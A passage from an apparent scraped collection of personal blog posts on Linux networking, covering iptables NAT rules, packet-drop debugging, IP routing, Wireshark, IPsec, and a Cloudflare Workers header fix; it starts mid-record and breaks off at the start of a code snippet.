[1629:320166]\n:OUTPUT ACCEPT [36545:10406977]\n:POSTROUTING ACCEPT [34390:10034797]\n:DOCKER - [0:0]\n-A PREROUTING -m addrtype --dst-type LOCAL -j DOCKER\n-A OUTPUT ! -d 127.0.0.0/8 -m addrtype --dst-type LOCAL -j DOCKER\n-A POSTROUTING -s 172.17.0.0/16 ! -o docker0 -j MASQUERADE\n-A DOCKER -i docker0 -j RETURN\nCOMMIT\n# Completed on Wed Jun  7 21:25:14 2017\n# Generated by iptables-save v1.6.0 on Wed Jun  7 21:25:14 2017\n*filter\n:INPUT ACCEPT [2078627:2180604942]\n:FORWARD ACCEPT [0:0]\n:OUTPUT ACCEPT [1617291:254682158]\n:DOCKER - [0:0]\n:DOCKER-ISOLATION - [0:0]\n-A FORWARD -j DOCKER-ISOLATION\n-A FORWARD -o docker0 -j DOCKER\n-A FORWARD -o docker0 -m conntrack --ctstate RELATED,ESTABLISHED -j\nACCEPT\n-A FORWARD -i docker0 ! -o docker0 -j ACCEPT\n-A FORWARD -i docker0 -o docker0 -j ACCEPT\n-A DOCKER-ISOLATION -j RETURN\nCOMMIT\n \n\n You can see on my laptop right now that I have a bunch of stuff in the\n filter  table and some more stuff in the  nat  table. And that it’s all\ngenerated by Docker. \n\n Okay, now that we’re able to look at iptables rules, how do we read\nthem? And how do we write our own?! \n\n the nat & filter tables \n\n The only tables I’ve seen Kubernetes use so far are the  nat  and\n filter  tables. The  filter  table mostly makes sense to me – you can\nset it up as a firewall to drop some packets, and read the man page to\nunderstand the syntax. In the example above there are a bunch of things\nin the FORWARD chain that apply to forwarded packets. I’m not sure how\nthe idea of a “forwarded packet” applies to Docker yet (I think  this documentation page “Understand container communication”  is relevant), but I’ll leave\nit there for now. \n\n But the nat table!! I have learned a few things about that! I’m going to break down a\nspecific nat table rule that I found in the Kubernetes source code\nbecause it took me a while to understand what it was doing. Here it is: \n\n /usr/sbin/iptables -w -t nat -A POSTROUTING -o eth0 -j MASQUERADE ! -d ${CONTAINER_SUBNET}\n \n\n The first  time (and possibly second & third times) I saw this my eyes\nkind of glazed over. I googled  iptables masquerade  like 5 times and\nwas like “why doesn’t the iptables man page even say the word masquerade\nat all?!?“. \n\n But it actually turned out to be important to know what this meant, so,\nnow I know!! Let’s break down the easy options first \n\n \n -w : this takes out an exclusive lock so that it can’t run\nconcurrently with other iptables executions. Makes sense. \n -A : just means “add a rule” \n POSTROUTING  is the name of a chain, it’s basically the last step in\niptables processing \n -o eth0 : means “the output interface is eth0” – so the packet is going out\nof the computer (and not for example being bridged to a Docker network\ninterface) \n \n\n Those aren’t so bad! Now let’s deal with the complicated part –  -j MASQUERADE ! -d $CONTAINER_SUBNET \n\n -j MASQUERADE  means “execute the MASQUERADE rule on this packet”. But\nwhat is the MASQUERADE rule? \n\n SNAT & MASQUERADE \n\n The problem this is trying to solve is – packets in Kubernetes that are\nsent from pods have pod IP addresses on them (which are different from\nthe “real” IP address on the host). This is fine, but if you send a\npacket to a computer outside of your cluster, they won’t know what that\nIP address means or how to route traffic back to it. \n\n This is a lot like the problem you have when you’re on a home network\n(your IP is 192.168.x.x), and you want to talk to hosts in the outside\nworld. They don’t know what 192.168.x.x means! \n\n The iptables.info documentation for  SNAT  says: \n\n \n This is what we want, for example, when several hosts have to share an\nInternet connection. We can then turn on ip forwarding in the kernel,\nand write an SNAT rule which will translate all packets going out from\nour local network to the source IP of our own Internet connection.\nWithout doing this, the outside world would not know where to send\nreply packets, since our local networks mostly use the IANA specified\nIP addresses which are allocated for LAN networks. If we forwarded\nthese packets as is, no one on the Internet would know that they were\nactually from us. The SNAT target does all the translation needed to\ndo this kind of work, letting all packets leaving our LAN look as if\nthey came from a single host, which would be our firewall. \n \n\n This sounds perfect! We need to set up a SNAT iptables rule! Except with\nSNAT you need to specify  which  IP address you want to rewrite the\nsource IP address to. So  MASQUERADE  lets you just rewrite packets to the\nhost’s IP address. \n\n iptables.info actually explains what\n MASQUERADE \nmeans, unlike the iptables man page. With this reference, it’s much\neasier to understand iptables incantations! Yay! \n\n having the right iptables rules is important \n\n iptables is kind of frustrating because if you don’t have the right\nrules you can end up in situations like “oh well, no networking works at\nall, oops”. And I don’t know any iptables debugging tools (though if you\ndo, I’d like to know!) so so far I just stare at the rules until I\nunderstand them. \n\n that’s all \n\n I am a little less intimidated by iptables than I was last week so\nthat’s good! \n\n"},
{"url": "https://jvns.ca/blog/2017/09/05/finding-out-where-packets-are-being-dropped/", "title": "Finding out if/why a server is dropping packets", "content": "\n     \n\n When packets are being dropped on a computer, they’re being dropped for\na  reason . How do you find out whether/why packets are being dropped? \n\n Here’s the situations we want to understand: \n\n \n a packet enters the network stack of your computer ( RX ) (say on\nport 8000). It gets dropped before the application listening on port\n8000 receives it. \n you send a packet ( TX ). Before it makes it out of your computer, it\ngets dropped. \n \n\n I’m not interested here in “packets are being dropped somewhere else on the\ninternet, let’s diagnose it with traceroute / by counting TCP retransmits”\n(though that’s important too!) \n\n how do you even know if packets are being dropped? \n\n I asked on Twitter and got the very useful answer “look at  netstat -i !”\nHere’s what that looks like on my laptop: \n\n bork@kiwi~> sudo netstat -i\nKernel Interface table\nIface       MTU Met   RX-OK RX-ERR RX-DRP RX-OVR    TX-OK TX-ERR TX-DRP TX-OVR Flg\ndocker0    1500 0         0      0      0 0             0      0      0      0 BMU\nenp0s25    1500 0   1235101      0    242 0        745760      0      0      0 BMRU\nlo        65536 0     21558      0      0 0         21558      0      0      0 LRU\nnlmon0     3776 0    551262      0      0 0             0      0      0      0 ORU\n \n\n It looks like there are some received ( RX ) packets being lost on  enp0s25 \n(my wireless card). No  TX  packets lost though! \n\n Someone also told me that running  ethtool -S  is useful but my ethtool doesn’t have a  -S  option. \n\n how do you know  why  packets are being dropped \n\n I was googling and I found this cool tool called  dropwatch . There isn’t any Ubuntu package for it but it’s on github:  https://github.com/pavel-odintsov/drop_watch . \n\n Here are the instructions that worked for me to compile it: \n\n sudo apt-get install -y libnl-3-dev libnl-genl-3-dev binutils-dev libreadline6-dev\ngit clone https://github.com/pavel-odintsov/drop_watch\ncd drop_watch/src\nvim Makefile # comment out the -Werror argument to gcc\nmake\n \n\n And here’s the output! It tells me at which kernel function I’m losing packets. Cool! \n\n sudo ./dropwatch -l kas\nInitalizing kallsyms db\ndropwatch> start\nEnabling monitoring...\nKernel monitoring activated.\nIssue Ctrl-C to stop monitoring\n\n1 drops at tcp_v4_do_rcv+cd (0xffffffff81799bad)\n10 drops at tcp_v4_rcv+80 (0xffffffff8179a620)\n1 drops at sk_stream_kill_queues+57 (0xffffffff81729ca7)\n4 drops at unix_release_sock+20e (0xffffffff817dc94e)\n1 drops at igmp_rcv+e1 (0xffffffff817b4c41)\n1 drops at igmp_rcv+e1 (0xffffffff817b4c41)\n \n\n monitoring dropped packets with perf \n\n Here’s another cool way to debug what’s happening! \n\n thomas graf  told me that you can monitor the\n kfree_skb  event using perf, and that will tell you when packets are being\ndropped (where in the kernel stack it happened): \n\n sudo perf record -g -a -e skb:kfree_skb\nsudo perf script\n \n\n advanced reading \n\n There’s also these two cool articles: \n\n \n Monitoring and Tuning the Linux Networking Stack: Receiving Data \n Monitoring and Tuning the Linux Networking Stack: Sending Data \n \n\n I still haven’t read them in full but they are extremely detailed and cool. \n\n tell me if you know more! \n\n I still haven’t ever used these tools to seriously debug a packet loss problem\nyet, just wanted to write this down so that I have the notes if I do want to in\nthe future! \n\n If you have better tips for debugging whether/why packets are being dropped on\na computer, let me know! \n\n"},
{"url": "https://jvns.ca/blog/2018/07/24/ip-addresses-routing/", "title": "IP addresses & routing", "content": "\n     \n\n Hello! Tomorrow I’m running a workshop at work about the humble IP address, so here are some notes\nabout IP addresses and how IP routing on Linux works! \n\n This came up because someone on my team pointed out that there’s actually a LOT going on with IP\naddresses even though it seems like a simple concept, and they said they’d like to learn more. Here\ngoes! \n\n This post is only about IPv4 because I’ve still never used IPv6. \n\n What’s in the IP header? \n\n Almost every packet your computer sends and receives (with some exceptions like  ARP packets ) has an IP header. \n\n There are  14 fields  in the IP header. The only 3\nimportant ones for most people to know about are: \n\n \n the source IP address \n the destination IP address \n the TTL (see:  how traceroute works ) \n \n\n One thing you’ll notice  isn’t  in the IP header is a port! The TCP and UDP protocols both have\nports, but that lives at a different network layer. (and is why TCP port 8080 and UDP port 8080 are\ndifferent ports, and can run different services!) \n\n There’s also a ‘protocol’ field that tells you the protocol (like TCP/UDP). \n\n What’s a subnet? \n\n IP addresses are often grouped into  subnets . The main useful thing to know about subnets is to\nunderstand CIDR notation –  168.23.0.0/8  means “all the packets that have the same first 8 bits as\nthe packet  168.23.0.0 ”. In this case that would be  168.*.*.* , or any packet beginning in 168\n(since each of the 4 numbers in an IP address is 8 bits). \n\n When I create a packet on my computer, what happens to it? \n\n Suppose you create a packet with IP address 1.2.3.4 on it. Where does it go? It turns out that this\nisn’t a super simple question – there are at least 3 possible systems that can affect your packet \n\n System 1: The route table \n\n The most likely system to affect your new packet destined to  1.2.3.4  is the  route table . On\nLinux, you can view your route table with  ip route list table all . Here’s what the route\ntable on my laptop looks like: \n\n $ ip route list table all\ndefault via 192.168.1.1 dev wlp3s0  proto static  metric 600 \n169.254.0.0/16 dev docker0  scope link  metric 1000 linkdown \n172.17.0.0/16 dev docker0  proto kernel  scope link  src 172.17.0.1 linkdown \n192.168.1.0/24 dev wlp3s0  proto kernel  scope link  src 192.168.1.170  metric 600 \nbroadcast 127.0.0.0 dev lo  table local  proto kernel  scope link  src 127.0.0.1 \nlocal 127.0.0.0/8 dev lo  table local  proto kernel  scope host  src 127.0.0.1 \n \n\n Each of these routes has: \n\n \n a  subnet  (127.0.0.0/8, 172.17.0.0/16, etc) \n a  network device  (my wireless card  wlp3s0 , the virtual loopback device  lo , the virtual\ndocker device  docker0 , etc) \n possibly something like  via 192.168.1.1  which means “send all packets like this to IP\n192.168.1.1’s MAC address, which happens to be Julia’s router” \n a bunch of other stuff which I don’t understand that well ( metric 600 ,  scope link ,  proto\nkernel , etc). Not understanding what those things mean hasn’t hurt me yet. \n \n\n The main things to pay attention to are the subnet and the network device. So  192.168.1.0/24 dev\nwlp3s0  means “send packets in the  192.168.1.0/24  range to the  wlp3s0  network device. That’s not\nso complicated! \n\n It’s useful to know a little bit about your Linux computer route table if you’re doing container\nnetworking, because with containers you’ll end up with one or more virtual network devices (like\n docker0 ) that packets will end up being sent to. \n\n That’s it for the route table! \n\n System 2: iptables \n\n Having read the above, you might think that the way packets get routed is: \n\n \n they come into your computer \n Linux looks at the route table and decides which network device to send to the packet to \n That’s it \n \n\n That’s often true, but not always!! There are a bunch of secret in between steps (“prerouting”,\n“output”, “postrouting”) where Linux says “hey, iptables, want to make changes to this packet\nhere?“. When this happens, iptables can change the source or destination IP address on the packet to\nbe something different. \n\n The two main things I’ve used this for are  DNAT  (“destination NAT”) and  SNAT  (“source NAT”) \n\n destination NAT \n\n Let’s start with destination NAT! One place this shows up is in this program called\n kube2iam . kube2iam is this program that you run on your host\nthat pretends to be the AWS metadata endpoint ( 169.254.169.254 ). Why you might want this isn’t\nimportant right now, but – how can kube2iam pretend to be this other IP address? That would mean\nthat we need to magically redirect those packets somehow? How? \n\n It turns out that forcing packets destined for 169.254.169.254 to go somewhere else is totally\npossible! Here’s the iptables rule that they suggest using: \n\n iptables \\\n  --append PREROUTING \\\n  --protocol tcp \\\n  --destination 169.254.169.254 \\\n  --dport 80 \\\n  --in-interface docker0 \\\n  --jump DNAT \\\n  --table nat \\\n  --to-destination $YOUR_IP_ADDRESS:8181\n \n\n Usually iptables rules make me want to hide under the couch but in the last year I’ve become a\nlittle less afraid of them. Here’s what’s going on with this one: \n\n \n it only applies to tcp packets to 169.254.169.254 port 80 that came from the  docker0  interface ( --protocol tcp ,  --dport 80 ,  --destination 169.254.168.254 ,  --in-interface docker0 ) \n it happens at the PREROUTING stage (before the packet gets assigned a network interface) \n it ( --jump DNAT ,  --table nat ,  --to-destination $YOUR_IP_ADDRESS:8181 ) \n \n\n What’s this DNAT thing? Basically what this means is that Linux won’t just rewrite packets to\n169.254.169.254:80 to go to $LOCAL_IP:8081, it’ll also modify the reply packets from $LOCAL_IP:8081\nto make them appear as if they came from 169.254.169.254. So from the perspective of the application\nreceiving the reply, it has no idea that it’s not talking to the IP 169.254.169.254. Lies!!! \n\n To make all this work, Linux needs to keep track of connection state and remember “hey, this reply\npacket is part of this DNATed connection so I need to rewrite it” \n\n Phew. Hopefully that made any sense. \n\n source NAT \n\n Source NAT is like destination NAT, except instead of rewriting destination IP address,\nit rewrites source IP addresses! \n\n The place I’ve used source NAT before is also for container stuff – if you have a bunch of\ncontainers with weird virtual container IP addresses sending packets to the outside world, you\ncan’t just let them use those IP addresses!! The outside world (like google) has no idea about your\ncontainer IPs and will not be able to reply to those packets. So you need to pretend that they come\nfrom your host. \n\n If this is you, you probably want an iptables rule something like this on your host: \n\n iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE\n \n\n MASQUERADE  is a confusing way of saying “use source NAT and pretend the packet is coming from this\nhost’s IP address”. What this rule does is rewrite the source IP address on every packet to pretend\nto be from the host’s IP. \n\n System 3: IPsec \n\n I’m not going to go into this much (I wrote about  IPsec the other day ),\nbut a third way packets can end up going to weird places is if you’re using IPsec. You can see\nwhat’s going on there with the  ip xfrm  command. It turns out  xfrm  stands for “transform”. \n\n some notes on AWS networking \n\n A lot of these concepts (a route table, NAT, IPSec) have their AWS networking analogs in  Amazon\nVirtual Private Cloud (VPC)  – much like you can control how packets\nget routed when they arrive on your Linux computer, you can use these AWS tools to control what\nhappens when you send packets from an instance in a VPC. I looked at the  VPC FAQ  today and it’s pretty good. \n\n here are some very rough mappings \n\n \n route table:  VPC route table , which\ncontrols how packets are routed in your VPC \n iptables/source NAT:  NAT gateway  or  Internet Gateway . If you have\nan AWS instance with no public IP address, you need to use source NAT (for the same reasons as we\ntalked about before with containers) to talk to the public internet. The way this works in AWS is you set up a NAT\ngateway/internet gateway which will rewrite your packets for you. \n IPsec:  VPC peering . This\nisn’t really the same thing (peering connections are only encrypted for cross-region traffic), but it does give you a way to\nset up private connections between two different VPCs and I think it’s useful in some of the same\nscenarios. \n \n\n"},
{"url": "https://jvns.ca/blog/2018/06/19/what-i-use-wireshark-for/", "title": "How I use Wireshark", "content": "\n     \n\n Hello! I was using Wireshark to debug a networking problem today, and I realized I’ve never written\na blog post about Wireshark! Wireshark is one of my very favourite networking tools, so let’s fix\nthat :) \n\n Wireshark is a really powerful and complicated tool, but in practice I only know how to do a very\nsmall number of things with it, and those things are really useful! So in this blog post, I’ll\nexplain the 5 main things I use Wireshark for, and hopefully you’ll have a slightly clearer idea of\nwhy it’s useful. \n\n what’s Wireshark? \n\n Wireshark  is a graphical network packet analysis tool. \n\n On Mac, you can download & install it from their homepage, and on Debian-based distros you can\ninstall it with  sudo apt install wireshark . There’s also an official\n wireshark-dev PPA  you can use to get\nmore up-to-date Wireshark versions. \n\n Wireshark looks like this, and it can be a little overwhelming at first. There’s a slightly\nmysterious search box, and a lot of packets, and how do you even use this thing? \n\n \n\n Use Wireshark to analyze pcap files \n\n Usually I use Wireshark to debug networking problems in production. My Wireshark workflow\nis: \n\n \n Capture packets with tcpdump (typically something like  sudo tcpdump port 443 -w output.pcap \n scp the pcap file to my laptop ( scp host:~/output.pcap . ) \n Open the pcap file in Wireshark ( wireshark output.pcap ) \n \n\n That’s pretty simple! But once you have a pcap file with a bunch of packets on your laptop, what do\nyou do with it? \n\n Look at a single TCP connection \n\n Often when I’m debugging something in Wireshark, what’s happened is that there’s some TCP\nconnection, and something went wrong with the connection for some reason. Wireshark\nmakes it really easy to look at the lifetime of a TCP connection and see what happened! \n\n You can do that by right clicking on a packet and clicking “Conversation filter” -> “TCP”. \n\n \n\n And then Wireshark will just show you other packets from the same TCP connection as that packet!!\nHere you’ll see a successful SSL connection  – there’s are packets that say “client hello”,\n“service hello”, “certificate”, “server key exchange”, which are all part of setting up a SSL\nconnection. Neat! \n\n \n\n I actually used this today to debug an SSL issue – at work today, some connections were being\nreset, and I noticed that after the “client hello” packet was sent, the client was sending a “FIN\nACK” packet which terminates the TLS connection. This was useful because I could tell that the\n client  was terminating the connection, not the server! So immediately I knew that the client was\nto blame and I could focus my investigations there. \n\n This pattern is pretty typical of how I use Wireshark. Usually there’s a client and a server, and\nthere’s a bug or configuration error on either the client or the server. Wireshark is invaluable for\nhelping me figure out whether I should blame the client or the server :) \n\n “Decode as” \n\n Wireshark uses the port to try to guess what kind of packet every packet is, and often it does a\ngood job! If it sees traffic on port 80, it’ll assume it’s HTTP traffic, and it’s usually right. \n\n But sometimes you have HTTP traffic happening on an unusual port, and you need to give Wireshark\nsome hints. If you right click on a packet and click “Decode as”, you can tell Wireshark what\nprotocol packets on that port are and then it’ll be much easier to navigate and search. \n\n See the contents of a packet \n\n Wireshark has an AMAZING details view that explains the contents of any packet. Let’s take the\n“client hello” packet from the details above. This packet is the first packet sent during a SSL\nconnection – the client is saying “hello! here I am!”. \n\n Wireshark gives you two super useful tools for investigating the contents of a packet. The first one\nis this view where you can expand every header the packet has (ethernet header! IP header! TCP\nheader!) and look at what’s in it: \n\n \n\n The second view, which is really magical, is this one which shows you the raw bytes of a packet. The\nneat thing about this is that if you hover over one of the bytes with your mouse (like here I’ve\nhovered over  tiles.services.mozilla.com ), it’ll tell you at the bottom of the screen what field\nthose bytes correspond to here (in this case the “Server Name” field) and the Wireshark codename for\nthat field (in this case  ssl.handshake.extensions_server_name ) \n\n \n\n Search for specific packets \n\n Wireshark has a great query language, and you can really easily search for specific packets! I\nusually just use really simple queries with Wireshark. Here are a few examples of the kinds of\nsearches I do: \n\n \n frame contains \"mozilla\"  – search for the string “mozilla” anywhere in the packet \n tcp.port == 443  – tcp port is 443 \n dns.resp.len > 0  – all DNS responses \n ip.addr == 52.7.23.87  – source or dest IP address is 52.7.23.87 \n \n\n Wireshark’s packet search language is much more powerful than tcpdump’s (and it has tab\ncompletion!!), so I’ll often capture a large amount of packets with tcpdump (“all packets on port\n443”) and then do some more in depth searching using Wireshark. \n\n see statistics on TCP connection duration \n\n Sometimes I want to specifically investigate slow TCP connections. But what if I have a packet\ncapture file with many thousands of packets?! How do I find the slow TCP connection? \n\n If you click ‘Statistics’ in the menu then ‘Conversations’, Wireshark will give you this amazing\nstatistics view that looks like this: \n\n \n\n This shows me the duration of every single TCP connection, so I can find the long ones and then\ninvestigate them in more detail! So useful :D \n\n use the latest Wireshark version \n\n If you haven’t upgraded Wireshark in a while, it’s worth upgrading! I was looking at some HTTP/2\npackets on my work laptop recently and was having a tough time. But then I looked at the docs and\nrealized I was running an old version of Wireshark. I upgraded, and Wireshark’s HTTP/2 support had\nreally improved in the newest version! \n\n use Wireshark to learn networking protocols \n\n There’s some networking jargon in this post (“frame”, “tcp port”, “dns response”, “source IP\naddress”, “SSL client hello”). I left it in because Wireshark definitely doesn’t abstract networking\ndetails away from you. That can definitely be intimidating at first! \n\n But Wireshark can actually be a great tool to learn a bit more about networking protocols. For\nexample, I don’t know too much about the details of how the TLS/SSL protocol works! But I can see that\nthe first two packets are “client hello” and “server hello”, and it makes the protocol seem less\nlike a scary mystery and more like a concrete thing that I can easily look at the details of. \n\n that’s all for now \n\n Wireshark has a TON of features and I definitely only use a small fraction of its features.  The 5\ntricks I’ve described here are probably 95% of what I use Wireshark for – you only need to know a\nlittle Wireshark to start using it to debug networking issues! \n\n"},
{"url": "https://jvns.ca/blog/2018/07/11/netdev-day-1--ipsec/", "title": "netdev day 1: IPsec!", "content": "\n     \n\n Hello! This year, like last year, I’m at the  netdev conference .\n(here are my  notes from last year ). \n\n Today at the conference I learned a lot about IPsec, so we’re going to talk about IPsec! There was\nan IPsec workshop given by Sowmini Varadhan and  Paul Wouters . All of the\nmistakes in this post are 100% my fault though :). \n\n what’s IPsec? \n\n IPsec is a protocol used to encrypt IP packets. Some VPNs are implemented with IPsec. One big thing\nI hadn’t really realized until today is that there isn’t just one protocol used for VPNs – I think\nVPN is just a general term meaning “your IP packets get encrypted and sent through another server”\nand VPNs can be implemented using a bunch of different protocols (OpenVPN, PPTP, SSTP, IPsec, etc)\nin a bunch of different ways. \n\n Why is IPsec different from other VPN protocols? (like, why was there a tutorial about it at netdev\nand not the other protocols?) My understanding is that there are 2 things that make it different: \n\n \n It’s an IETF standard, documented in eg  RFC 6071  (did you\nknow the IETF is the group that makes RFCs? I didn’t until today!) \n it’s implemented in the Linux kernel (so it makes sense that there was a netdev tutorial on it,\nsince netdev is a Linux kernel networking conference :)) \n \n\n How does IPsec work? \n\n So let’s say your laptop is using IPsec to encrypt its packets and send them through another device.\nHow does that work? There are 2 parts to IPsec: a userspace part, and a kernel part. \n\n The userspace part of IPsec is responsible for  key exchange , using a protocol called\n IKE  (“internet key exchange”). Basically when\nyou open a new VPN connection, you need to talk to the VPN server and negotiate a key to do\nencryption. \n\n The kernel part of IPsec is responsible for the actual encryption of packets – once a key is\ngenerated using IKE, the userspace part of IPsec will tell the kernel which encryption key to\nuse. Then the kernel will use that key to encrypt packets! \n\n Security Policy & Security Associations \n\n The kernel part of IPSec has two databases: the  security policy database  (SPD) and the\n security association database  (SAD). \n\n The security policy database has IP ranges and rules for what to do to packets for that IP range\n(“do IPsec to it”, “drop the packet”, “let it through”). I find this a little confusing because I’m\nused to rules about what to do to packets in various IP ranges being in the route table ( sudo ip\nroute list ), but apparently you can have IPsec rules too and they’re in a different place! \n\n The security association database I think has the encryption keys to use for various IPs. \n\n The way you inspect these databases is, extremely unintuitively, using a command called  ip xfrm .\nWhat does xfrm mean? I don’t know! \n\n # security policy database\n$ sudo ip xfrm policy\n$ sudo ip x p\n\n# security association database\n$ sudo ip xfrm state\n$ sudo ip x s\n \n\n Why is IPsec implemented in the Linux kernel and TLS isn’t? \n\n For both TLS and IPsec, you need to do a key exchange when opening the connection (using\nDiffie-Hellman or something). For some reason that might be obvious but that I don’t understand yet\n(??) people don’t want to do key exchange in the kernel. \n\n The reason IPsec is easier to implement in the kernel is that with IPsec, you need to negotiate key\nexchanges much less frequently (once for every IP address you want to open a VPN connection with),\nand IPsec sessions are much longer lived. So it’s easy for userspace to do a key exchange, get the\nkey, and hand it off to the kernel which will then use that key for every IP packet. \n\n With TLS, there are a couple of problems: \n\n a. you’re constantly doing new key exchanges every time you open a new TLS connection, and TLS\n   connections are shorter-lived\nb. there isn’t a natural protocol boundary where you need to start doing encryption – with IPsec,\n   you just encrypt every IP packet in a given IP range, but with TLS you need to look at your TCP\n   stream, recognize whether the TCP packet is a data packet or not, and decide to encrypt it \n\n There’s actually a patch  implementing TLS in the Linux kernel  which lets userspace\ndo key exchange and then pass the kernel the keys, so this obviously isn’t impossible, but it’s a\nmuch newer thing and I think it’s more complicated with TLS than with IPsec. \n\n What software do you use to do IPsec? \n\n The ones I know about are Libreswan and Strongswan. Today’s tutorial focused on Libreswan. \n\n Somewhat confusingly, even though Libreswan and Strongswan are different software packages, they\nboth install a binary called  ipsec  for managing IPsec connections, and the two  ipsec  binaries\nare not the same program (even though they do have the same role). \n\n Strongswan and Libreswan do what’s described in the “how does IPsec work” section above – they do\nkey exchange with IKE and tell the kernel about keys to configure it to do encryption. \n\n IPsec isn’t only for VPNs! \n\n At the beginning of this post I said “IPsec is a VPN protocol”, which is true, but you don’t have to\nuse IPsec to implement VPNs! There are actually two ways to use IPsec: \n\n \n “transport mode”, where the IP header is unchanged and only the contents of the IP packet are\nencrypted. This mode is a little more like using TLS – you talk to the server you’re\ncommunicating with directly (not through a VPN server or something), it’s just that the contents\nof the IP packet get encrypted \n “tunnel mode”, where the IP header and its contents are all encrypted and encapsulated into\nanother UDP packet. This is the mode that’s used for VPNs – you take your packet that you’re\nsending to secret_site.com, encrypt it, send it to your VPN server, and the VPN server passes it\non for you. \n \n\n opportunistic IPsec \n\n An interesting application of “transport mode” IPsec I learned about today (where you open an IPsec\nconnection directly with the host you’re communicating with instead of some other intermediary\nserver) is this thing called “opportunistic IPsec”. There’s an opportunistic IPsec server here:\n http://oe.libreswan.org/ . \n\n I think the idea is that if you set up Libreswan and unbound up on your computer, then when you\nconnect to  http://oe.libreswan.org , what happens is: \n\n \n unbound  makes a DNS query for the IPSECKEY record of oe.libreswan.org ( dig ipseckey\noe.libreswan.org ) to get a public key to use for that domain. (this requires DNSSEC to be secure\nwhich when I learn about it will be a whole other blog post, but you can just run that DNS query\nwith dig and it will work if you want to see the results) \n unbound  gives the public key to libreswan, which uses it to do a key exchange with the IKE\nserver running on oe.libreswan.org \n libreswan  finishes the key exchange, gives the encryption key to the kernel, and tells the\nkernel to use that encryption key when talking to  oe.libreswan.org \n Your connection is now encrypted! Even though it’s a HTTP connection! so interesting! \n \n\n IPsec and TLS learn from each other \n\n One interesting tidbit from the tutorial today was that the IPsec and TLS protocols have actually\nlearned from each other over time – like they said IPsec’s IKE protocol had perfect forward secrecy\nbefore TLS, and IPsec has also learned some things from TLS. It’s neat to hear about how different\ninternet protocols are learning & changing over time! \n\n IPsec is interesting! \n\n I’ve spent quite a lot of time learning about TLS, which is obviously a super important networking\nprotocol (let’s encrypt the internet! :D). But IPsec is an important internet encryption protocol\ntoo, and it has a different role from TLS! Apparently some mobile phone protocols (like 5G/LTE) use\nIPsec to encrypt their network traffic! \n\n I’m happy I know a little more about it now! As usual several things in this post are probably\nwrong, but hopefully not too wrong :) \n\n"},
{"url": "https://jvns.ca/blog/2018/09/03/editing-my-blog-s-http-headers-with-cloudflare-workers/", "title": "Editing my blog's HTTP headers with Cloudflare workers", "content": "\n     \n\n Hello! For the last 6 months, I’ve had a problem on this blog where every so often a page would show\nup like this: \n\n \n\n Instead of rendering the HTML, it would just display the HTML. Not all the time, just… sometimes. \n\n I’ve gotten a lot of messages from readers with screenshots of this, and it’s no fun! People do not\nwant to read raw HTML. I would like my pages to render! I finally (I think) have a solution to this,\nso I wanted to write up what I did. \n\n The mystery of the missing Content-Type header \n\n It was clear basically the first time this happened that the reason was that there was a missing\nHTTP  Content-Type  header. The  Content-Type  for HTML pages is supposed to be set to\n Content-Type: text/html; charset=UTF-8 . You can see this header with  curl -I : \n\n $ curl -I https://jvns.ca/\nHTTP/1.1 200 OK\nDate: Mon, 03 Sep 2018 13:59:16 GMT\nContent-Type: text/html; charset=UTF-8 <========= this one\nContent-Length: 0\nConnection: keep-alive\nCF-Cache-Status: HIT\nCache-Control: public, max-age=3600\nCF-RAY: 4548bc69fc6c3fb9-YUL\nExpires: Mon, 03 Sep 2018 14:59:16 GMT\nLast-Modified: Sun, 02 Sep 2018 14:21:53 GMT\nStrict-Transport-Security: max-age=2592000\nVary: Accept-Encoding\nVia: e4s\nX-Content-Type-Options: nosniff\nServer: cloudflare\n \n\n But sometimes, that Content-Type header would be missing. Weird!!! The most confusing thing about\nthis was that it happened very infrequently, and usually only on one page at a time, which made it a\nlot harder to debug. \n\n I haven’t had too much energy to debug this because while I think debugging weird computer\nnetworking bugs is super fun, what I’ve been doing at work for the last while has been debugging\ncomputer networking bugs and so I’m not that motivated to do it at home too. So that’s why this has\nlasted for 6 months :) \n\n why is the Content-Type header missing? \n\n So, why is the Content-Type header sometimes missing? I actually don’t know! My site is served by\nnearlyfreespeech.net and cached by Cloudflare, so it’s something in there somewhere. Either: \n\n \n my webhost is not serving a Content-Type header sometimes (which doesn’t make much sense) \n the CDN is deleting the Content-Type header (which makes even less sense) \n \n\n This isn’t the first time something like this happened – in 2017, the  Content-Encoding: gzip \nheader  mysteriously disappeared  and I\nnever found out why that was either. But! Even though I don’t know  why  this is happening and I\nhave no visibility into it, I can still try to fix it! \n\n things I tried \n\n Before talking about my latest solution that I think will work, here are some things that I tried\nthat didn’t work: \n\n \n clearing my Cloudflare cache lots of times (this would temporarily fix the problem, but it would\njust crop up again later) \n upgrading to a new ‘realm’ on my webhost, in the hopes that there was a bad Apache server or\nsomething that I could move away from \n Making sure  <!DOCTYPE html>  was at the beginning of all my HTML in case that helped browsers\nfigure it out it was HTML (it didn’t) \n Switching away from nearlyfreespeech’s “free beta bandwidth” program \n emailing Cloudflare’s support to see if they knew anything about this \n making a lot of  curl  requests to my webhost directly to see if I could reproduce it (I couldn’t) \n \n\n None of these things worked. The most annoying thing about this issue is that I couldn’t reliably\nreproduce it, so it seemed hard to report to my web host (“hey, i have this problem periodically,\nbut you can’t observe it, you just have to take my word that it happens, can you do something?“) \n\n The most obvious things to try that I haven’t tried are: \n\n \n changing web hosts to S3 or Github Pages or something (changing web hosts is time consuming &\nannoying!) \n don’t use a CDN so that bad HTTP responses don’t get cached (for various reasons I want to keep\nusing a CDN :) ) \n \n\n what worked: Cloudflare workers \n\n At some point someone at Cloudflare very kindly offered to help me with my weird problem, and\nsuggested I use a new Cloudflare feature:  cloudflare workers . \n\n Basically Cloudflare Workers let you run a custom bit of Javascript on their servers for every HTTP\nrequest that modifies the HTTP response. It costs $5/month to get started. This is useful because I\n know  that I want there always to be a Content-Type header. So if I can write some Javascript that\nmodifies the response header if there’s no Content-Type header, I can fix this problem!!! \n\n When I woke up this morning a bunch of folks had tweeted at me saying that this problem had cropped\nup again. I’d made an attempt at using Cloudflare workers in the past and not quite gotten it to\nwork, but since I was able to see the problem on my laptop (a very good thing, if I wanted to test a\nfix!!), I decided to give it a shot again. \n\n my Javascript code \n\n And this morning I got the Cloudflare workers working to fix the  Content-Type  header!!! So many\ntiny little robots making things better. \n\n Here’s my Javascript code! It basically just checks to see if the  Content-Type  header is missing\nand if so, creates a new different Response object which includes a  Content-Type  header. The\nreason I didn’t just modify the headers is that it turns out that you can’t modify the headers on a\nResponse object, so I needed to create a new one. \n\n I also added a  x-julia-test  header for debugging purposes, so that I know that any response with\n x-julia-test  got its  Content-Type  header edited. \n\n addEventListener('fetch', event => 